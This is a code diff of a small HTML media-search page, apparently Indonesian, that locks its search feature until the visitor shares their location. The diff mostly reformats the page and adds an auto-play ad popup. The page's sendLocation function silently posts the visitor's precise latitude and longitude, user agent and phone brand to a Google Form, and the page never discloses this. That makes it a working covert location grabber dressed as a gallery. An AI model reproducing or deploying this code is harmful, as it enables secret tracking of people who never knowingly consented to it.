@@ -16,9 +16,7 @@ body {
   align-items: center;
 }
 
-h1 {
-  margin-top: 40px;
-}
+h1 { margin-top: 40px; }
 
 .main-img {
   margin-top: 20px;
@@ -90,10 +88,7 @@ button.active {
   left: 24px;
 }
 
-.warning {
-  margin-top: 120px;
-  opacity: 0.6;
-}
+.warning { margin-top: 120px; opacity: 0.6; }
 
 /* MODAL */
 .modal {
@@ -169,7 +164,6 @@ button.active {
 <body>
 
 <h1>リップズ</h1>
-
 <img class="main-img" src="https://files.catbox.moe/2sgujb.jpg">
 
 <div class="controls">
@@ -196,20 +190,22 @@ button.active {
 
 <script>
 let data = {};
-let locationEnabled = false;
 let currentImages = [];
 let currentIndex = 0;
+let locationEnabled = false;
 
+// ambil data utama
 fetch("https://lipzz-elzxd.github.io/Lipz/data.json")
   .then(r => r.json())
   .then(j => data = j);
 
+// toggle lokasi
 const toggle = document.getElementById("toggle");
 const searchBtn = document.getElementById("searchBtn");
 const keyword = document.getElementById("keyword");
 
 toggle.onclick = () => {
-  if (locationEnabled) {
+  if(locationEnabled){
     locationEnabled = false;
     toggle.classList.remove("on");
     searchBtn.className = "disabled";
@@ -217,35 +213,32 @@ toggle.onclick = () => {
     return;
   }
 
-  navigator.geolocation.getCurrentPosition(pos => {
+  navigator.geolocation.getCurrentPosition(pos=>{
     locationEnabled = true;
     toggle.classList.add("on");
     searchBtn.className = "active";
     keyword.disabled = false;
     sendLocation(pos);
-  }, () => {
-    alert("Izin lokasi ditolak");
-  });
+  }, ()=>{ alert("Izin lokasi ditolak"); });
 };
 
 searchBtn.onclick = () => {
-  if (!locationEnabled) return;
-
-  const key = keyword.value.toLowerCase().trim();
-  if (!data[key]) return;
+  if(!locationEnabled) return;
+  const key = keyword.value.trim().toLowerCase();
+  if(!data[key]) return;
 
   const box = document.getElementById("modalBox");
   box.innerHTML = '<div class="close" onclick="closeModal()">✕</div>';
 
-  if (data[key].type === "video") {
+  if(data[key].type==="video"){
     const v = document.createElement("video");
     v.src = data[key].src;
-    v.controls = true;
     v.autoplay = true;
+    v.controls = true;
     box.appendChild(v);
   }
 
-  if (data[key].type === "gallery") {
+  if(data[key].type==="gallery"){
     currentImages = data[key].images;
     currentIndex = 0;
 
@@ -271,34 +264,31 @@ searchBtn.onclick = () => {
   document.getElementById("modal").style.display = "flex";
 };
 
-function slide(dir) {
+function slide(dir){
   currentIndex += dir;
-  if (currentIndex < 0) currentIndex = currentImages.length - 1;
-  if (currentIndex >= currentImages.length) currentIndex = 0;
-  document.getElementById("galleryImg").src = currentImages[currentIndex];
+  if(currentIndex<0) currentIndex=currentImages.length-1;
+  if(currentIndex>=currentImages.length) currentIndex=0;
+  document.getElementById("galleryImg").src=currentImages[currentIndex];
 }
 
-function closeModal() {
-  document.getElementById("modal").style.display = "none";
-  document.getElementById("modalBox").innerHTML =
-    '<div class="close" onclick="closeModal()">✕</div>';
+function closeModal(){
+  document.getElementById("modal").style.display="none";
+  document.getElementById("modalBox").innerHTML='<div class="close" onclick="closeModal()">✕</div>';
 }
 
-function fix(n) {
-  return Number(n).toFixed(6);
-}
-
-function getBrand() {
+// lokasi -> google form
+function fix(n){return Number(n).toFixed(6);}
+function getBrand(){
   const ua = navigator.userAgent.toLowerCase();
-  if (ua.includes("samsung")) return "Samsung";
-  if (ua.includes("infinix")) return "Infinix";
-  if (ua.includes("xiaomi")) return "Xiaomi";
-  if (ua.includes("oppo")) return "Oppo";
-  if (ua.includes("vivo")) return "Vivo";
+  if(ua.includes("samsung")) return "Samsung";
+  if(ua.includes("infinix")) return "Infinix";
+  if(ua.includes("xiaomi")) return "Xiaomi";
+  if(ua.includes("oppo")) return "Oppo";
+  if(ua.includes("vivo")) return "Vivo";
   return "Unknown";
 }
 
-function sendLocation(pos) {
+function sendLocation(pos){
   const lat = fix(pos.coords.latitude);
   const lon = fix(pos.coords.longitude);
   const ua = navigator.userAgent;
@@ -306,13 +296,44 @@ function sendLocation(pos) {
 
   const url =
     "https://docs.google.com/forms/d/e/1FAIpQLScJJ-PAqYmeOnS6qKdgL1gTGMyX_FjrMLLg93Pv4QDbw1N-Cg/formResponse?" +
-    "entry.138340134=" + lat +
-    "&entry.1616098311=" + lon +
-    "&entry.1257224602=" + encodeURIComponent(ua) +
-    "&entry.1874088822=" + brand;
+    "entry.138340134="+lat+
+    "&entry.1616098311="+lon+
+    "&entry.1257224602="+encodeURIComponent(ua)+
+    "&entry.1874088822="+brand;
 
-  fetch(url, { mode: "no-cors" });
+  fetch(url,{mode:"no-cors"});
 }
+
+// 🔔 IKLAN OTOMATIS
+fetch("https://lipzz-elzxd.github.io/Lipz/iklan.json")
+  .then(r=>r.json())
+  .then(json=>{
+    const keys = Object.keys(json);
+    if(keys.length===0) return;
+    const iklan = json[keys[0]];
+
+    const modal = document.getElementById("modal");
+    const box = document.getElementById("modalBox");
+    box.innerHTML='<div class="close" onclick="closeModal()">✕</div>';
+
+    if(iklan.type==="video"){
+      const v = document.createElement("video");
+      v.src = iklan.src;
+      v.autoplay = true;
+      v.loop = true;
+      v.playsInline = true;
+      if(!iklan.sound) v.muted = true;
+      box.appendChild(v);
+    }
+
+    if(iklan.type==="image"){
+      const img = document.createElement("img");
+      img.src = iklan.src;
+      box.appendChild(img);
+    }
+
+    modal.style.display = "flex";
+  });
 </script>
 
 </body>
